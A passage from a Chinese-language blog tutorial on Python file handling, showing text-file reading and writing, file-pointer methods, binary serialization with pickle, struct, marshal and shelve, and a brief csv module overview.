<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#文件操作</span><br><span class="hljs-comment">#写文件：</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./1.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    num=file.write(<span class="hljs-string">&quot;天空再怎么黑暗\n我的内心依旧光明&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写了%d个字符&quot;</span>%num)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/4.jpg"></p>
<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/5.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#向文件中追加内容:</span><br><span class="hljs-built_in">str</span>=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入内容：&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./1.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<span class="hljs-comment">#参数a是以追加方式打开</span><br>    file.write(<span class="hljs-string">&quot;\n&quot;</span>)<br>    num=file.write(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写了%d个字符&quot;</span> % num)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/6.jpg"></p>
<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/7.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#向文件中写入元组：</span><br>mingtuple=(<span class="hljs-string">&quot;王阳明&quot;</span>,<span class="hljs-string">&quot;郑和&quot;</span>,<span class="hljs-string">&quot;戚继光&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./ming.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    num=file.write(<span class="hljs-built_in">str</span>(mingtuple))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;将元组写入文件&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/8.jpg"></p>
<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/9.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用file.writelines(sequence)向文件中写入字符序列：</span><br><span class="hljs-built_in">str</span>=[<span class="hljs-string">&quot;好雨知时节，当春乃发生.\n&quot;</span>,<span class="hljs-string">&quot;随风潜入夜，润物细无声&quot;</span>]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;杜甫.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    file.writelines(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写入字符序列成功！&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/10.jpg"></p>
<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/11.jpg"></p>
</li>
</ul>
</li>
<li><p>读文件：三个函数file.read(),file.readline(),file.readlines()</p>
<ul>
<li><p>file.read([size]):读取一个文件的内容，返回一个字符串对象size是要读取内容的数目是可选参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#文件读取：</span><br><span class="hljs-comment">#file.read()和for循环读取文件内容:</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./杜甫.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-built_in">str</span>=file.read()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;分割线&quot;</span>,<span class="hljs-string">&#x27;-&#x27;</span>*<span class="hljs-number">20</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> file:<br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27; &#x27;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/12.jpg"></p>
<ul>
<li><p>file.readline([size])函数从文件中读取一行返回一个字符串对象size为内容的数目可选</p>
<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/13.jpg"></p>
</li>
<li><p>file.readlines([sizeint]):功能是读取并返回该文件中包含的所有行，以字符串列表形式返回sizeint为读取的字节数，可选参数</p>
<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/14.jpg"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>其他文件操作：</p>
<ul>
<li>file.close():关闭文件。关闭文件后不能进行读写操作。</li>
<li>file.flash():刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件，而不是被动地等待输出缓冲区写入</li>
<li>file.fileno():返回一个整型的文件描述符</li>
<li>file.isatty():如果文件连接到一个终端设备则返回true，否则返回false</li>
<li>file.tell():返回文件当前位置</li>
<li>file.seek():重定位文件对象的指针位置</li>
<li>file.truncate([size]):从文件的首行首字符开始截断，截断文件为size个字符，无size表示从当前位置截断：截断之后后面的所有字符被删除</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用file.tell()和file.seek()重定位</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./1.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    data=file.readline()<br>    <span class="hljs-built_in">print</span>(data.strip())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;输出一行后的文件指针在：&#x27;</span>,file.tell())<span class="hljs-comment">#查看指针位置</span><br>    file.seek(<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用seek()将文件指针放回开始处：&#x27;</span>,file.tell())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;再次输出：&#x27;</span>,file.readlines())<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/15.jpg"></p>
</li>
</ol>
<h3 id="二进制文件访问："><a href="#二进制文件访问：" class="headerlink" title="二进制文件访问："></a>二进制文件访问：</h3><p>对二进制文件不能直接用记事本等文本编辑软件直接进行读写，也无法通过python的文件对象直接读取和理解二进制文件中的内容，要想正确读写二进制文件必须理解二进制文件的结构，序列化，反序列化。</p>
<ul>
<li>序列化：指的是把内存中的数据对象在不丢失其类型的情况下转换成对应的二进制信息</li>
<li>反序列化：将二进制信息准确无误地恢复到原来的数据对象的过程</li>
</ul>
<p>二进制文件访问的三步：</p>
<ol>
<li>打开二进制文件</li>
<li>访问二进制文件，写操作是将要写入的内容序列化后写入文件的过程，操作是将二进制文件内容读出反序列化的过程</li>
<li>关闭二进制文件</li>
</ol>
<h3 id="使用pickle模块读写二进制文件："><a href="#使用pickle模块读写二进制文件：" class="headerlink" title="使用pickle模块读写二进制文件："></a>使用pickle模块读写二进制文件：</h3><p>pickle模块只能在python中使用，几乎python中所有的数据类型都可以用pickle模块实现序列化。</p>
<p>pickle模块有两个函数：pickle.dump()序列化数据对象，并将该对象写入二进制文件：格式“pickle.dump(data，file[,protocoll])”data为写入二进制文件的数据对象，file创建或打开的文件对象，protocol为序列化的模式。</p>
<p>pickle.load(file):反序列化函数，将二进制文件中的内容解析为一个数据对象，file为打开二进制文件对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用pickle模块读写二进制文件：</span><br><span class="hljs-keyword">import</span> pickle<br>list1=[<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>]<br>tuple1=(<span class="hljs-string">&quot;music&quot;</span>,<span class="hljs-string">&quot;game&quot;</span>,<span class="hljs-string">&quot;sports&quot;</span>)<br>data = [list1,tuple1]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./二进制文件读写.txt&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<span class="hljs-keyword">as</span> pickle_file:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        pickle.dump(i,pickle_file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写入数据成功！&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/16.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#读：</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./二进制文件读写.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> picklef:<br>    data1=pickle.load(picklef)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data1:&quot;</span>,data1)<br>    data2=pickle.load(picklef)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data2:&quot;</span>,data2)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/17.jpg"></p>
<h3 id="使用struct模块读写二进制文件："><a href="#使用struct模块读写二进制文件：" class="headerlink" title="使用struct模块读写二进制文件："></a>使用struct模块读写二进制文件：</h3><p>方法：</p>
<ol>
<li>向二进制文件中写数据，先使用pack（）函数对数据对象按指定的格式进行序列化，然后使用文件对象write()函数将序列化的结果写入二进制文件</li>
<li>从二进制文件中读数据，先使用文件对象的read()函数读取二进制文件中的内容然后使用struct模块的unpack()函数完成反序列化后得到原来的数据对象</li>
</ol>
<p>函数格式：</p>
<p>struct.pack(fmt,data1,data2…):fmt给定格式化字符串，data1、data2为要写入的数据对象</p>
<p>struct.unpack(fmt,string):fmt为给定格式化字符串，string为反序列化的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#读</span><br><span class="hljs-keyword">import</span> struct<br>a=<span class="hljs-string">&quot;hello&quot;</span><br>b=<span class="hljs-number">32</span><br>c=<span class="hljs-number">89.6</span><br>binary1=struct.pack(<span class="hljs-string">&#x27;5sif&#x27;</span>,a.encode(<span class="hljs-string">&quot;utf-8&quot;</span>),b,c)<span class="hljs-comment">#5字符串长度s类型if也是类型</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./struct二进制文件读写.txt&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> struct_file:<br>    struct_file.write(binary1)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写入数据成功！&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/18.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#写：</span><br><span class="hljs-keyword">import</span>  struct<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./struct二进制文件读写.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    binary1=file.read()<br>    a,b,c=struct.unpack(<span class="hljs-string">&quot;5sif&quot;</span>,binary1)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s   %d   %f&quot;</span>%(a,b,c))<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/19.jpg"></p>
<h3 id="使用marshal模块读写二进制文件："><a href="#使用marshal模块读写二进制文件：" class="headerlink" title="使用marshal模块读写二进制文件："></a>使用marshal模块读写二进制文件：</h3><p>marshal.dump(data,file):将数据对象序列化后写入二进制文件中，data待序列化数据对象，file为创建或打开文件对象</p>
<p>marshal.load(file)：将二进制文件中的内容反序列化为数据对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用marshal模块读写二进制文件</span><br><span class="hljs-comment">#写</span><br><span class="hljs-keyword">import</span> marshal<br>data1=[<span class="hljs-string">&#x27;def&#x27;</span>,<span class="hljs-number">34</span>,<span class="hljs-number">89</span>]<br>data2=&#123;<span class="hljs-number">1</span>:<span class="hljs-string">&quot;优秀&quot;</span>,<span class="hljs-number">2</span>:<span class="hljs-string">&quot;良好&quot;</span>,<span class="hljs-number">3</span>:<span class="hljs-string">&quot;合格&quot;</span>,<span class="hljs-number">4</span>:<span class="hljs-string">&quot;不合格&quot;</span>&#125;<br>data3=(<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./marshal二进制文件读写.txt&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<span class="hljs-keyword">as</span> file:<br>    marshal.dump(data1,file)<br>    marshal.dump(data2,file)<br>    marshal.dump(data3,file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写入数据成功！&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/20.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#读：</span><br><span class="hljs-keyword">import</span> marshal<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./marshal二进制文件读写.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<span class="hljs-keyword">as</span> file:<br>    data1=marshal.load(file)<br>    data2 = marshal.load(file)<br>    data3 = marshal.load(file)<br>    <span class="hljs-built_in">print</span>(data1)<br>    <span class="hljs-built_in">print</span>(data2)<br>    <span class="hljs-built_in">print</span>(data3)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/21.jpg"></p>
<h3 id="使用shelve模块读写二进制文件："><a href="#使用shelve模块读写二进制文件：" class="headerlink" title="使用shelve模块读写二进制文件："></a>使用shelve模块读写二进制文件：</h3><p>shelve模块提供一种类似字典方式操作二进制文件的功能，如向二进制文件中写入、读出、修改数据。提供一个简单的数据存储方案，只有一个open()函数，它接收一个文件名作为参数，返回一个shelf对象.</p>
<p>shelve.open(filename,mode,protocol=None,writeback=False)</p>
<p>filename:打开或创建二进制文件</p>
<p>model:文件打开模式：</p>
<ol>
<li>‘c’:如果文件不存在则创建允许读写</li>
<li>‘r’:只读</li>
<li>‘w’:可读可写</li>
<li>‘n’:每次调用open()函数都重新创建一个空文件，可读可写。</li>
</ol>
<p>protocol:序列化模式，可以是1或2，默认None</p>
<p>writeback:是否将所有从二进制文件中读取的对象存放到一个内存缓存，默认False</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用shelve模块读写二进制文件</span><br><span class="hljs-comment">#写：</span><br><span class="hljs-keyword">import</span> shelve<br>tg=<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>([<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;age&#x27;</span>],[<span class="hljs-string">&#x27;dong&#x27;</span>,<span class="hljs-number">31</span>]))<span class="hljs-comment">#zip()是Python的一个内建函数，它接受一系列可迭代的对象作为参数，将对象中对应的元素打包成一个个tuple（元组），然后返回由这些tuples组成的list（列表）</span><br>tj=<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>([<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;age&#x27;</span>],[<span class="hljs-string">&#x27;li&#x27;</span>,<span class="hljs-number">42</span>]))<br><span class="hljs-keyword">with</span> shelve.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shelve_file&#x27;</span>)<span class="hljs-keyword">as</span> shelve_file:<br>    shelve_file[<span class="hljs-string">&#x27;tg&#x27;</span>]=tg<br>    shelve_file[<span class="hljs-string">&#x27;tj&#x27;</span>]=tj<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写入数据成功！&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/22.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#读：</span><br><span class="hljs-keyword">import</span>  shelve<br><span class="hljs-keyword">with</span> shelve.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shelve_file&#x27;</span>)<span class="hljs-keyword">as</span> shelve_file:<br>    <span class="hljs-built_in">print</span>(shelve_file[<span class="hljs-string">&#x27;tg&#x27;</span>])<br>    <span class="hljs-built_in">print</span>(shelve_file[<span class="hljs-string">&#x27;tj&#x27;</span>])<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/23.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#修改：</span><br><span class="hljs-keyword">import</span>  shelve<br><span class="hljs-keyword">with</span> shelve.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shelve_file&#x27;</span>)<span class="hljs-keyword">as</span> file:<br>    tg=file[<span class="hljs-string">&#x27;tg&#x27;</span>]<br>    tg[<span class="hljs-string">&#x27;name&#x27;</span>]=<span class="hljs-string">&#x27;kei&#x27;</span><br>    file[<span class="hljs-string">&#x27;tg&#x27;</span>]=tg<br>    <span class="hljs-built_in">print</span>(file[<span class="hljs-string">&#x27;tg&#x27;</span>])<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/24.jpg"></p>
<h3 id="csv文件操作："><a href="#csv文件操作：" class="headerlink" title="csv文件操作："></a>csv文件操作：</h3><p>csv(comma separated values,逗号分隔值)文件是一种常用的文本格式文件，用于存储表格数据，包括数字，字符等。python内置了csv模块处理csv文件常用函数如下：</p>
<ol>
<li>csv.writer(csvfile):返回一个witer对象。csvfile为打开的csv文件对象</li>
<li>writer.writerow(row):写入一行到csv文件</li>
<li>writer.writerows(rows):写入多行到csv文件</li>
<li>csv.reader(csvfile):返回一个reader对象来读文件</li>
</ol>
<h1 id="本文结束"><a href="#本文结束" class="headerlink" title="本文结束"></a>本文结束</h1>
            
        </article>
    </div>
    
</section>

    <nav class="nexmoe-page-nav">
        <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/"><i class="nexmoefont icon-right"></i></a>
    </nav>
  
            <div class="nexmoe-post-right">
              <div class="nexmoe-fixed">
                  <div class="nexmoe-tool"> 
                    
                      
                        
                          
                          
                          
                      
                    
                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
                  </div>
              </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

 

<script async src="/js/app.js?v=1679977717829"></script>

<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
<script>
	$(".justified-gallery").justifiedGallery({
		rowHeight: 160,
		margins: 10,
	});
</script>


    





</body>

</html>
